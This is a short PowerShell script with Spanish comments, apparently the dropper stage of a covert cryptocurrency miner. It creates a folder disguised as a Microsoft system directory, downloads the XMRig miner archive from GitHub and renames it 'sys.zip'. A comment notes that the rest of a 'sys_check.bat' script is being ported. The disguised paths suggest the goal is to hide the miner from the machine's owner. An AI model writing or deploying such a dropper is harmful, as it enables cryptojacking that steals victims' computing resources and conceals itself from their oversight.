$arch = (Get-WmiObject Win32_Processor).AddressWidth
$dir = "C:\ProgramData\Microsoft\NetworkModules"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

if ($arch -eq 64) {
    # Descarga versión 64 bits
    Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip" -OutFile "$dir\sys.zip"
} else {
    # Descarga versión 32 bits (si estuviera disponible o una alternativa)
    Write-Host "Arquitectura 32-bit detectada. Ajustando parámetros..."
}
# ... resto de la lógica de sys_check.bat adaptada a PowerShell
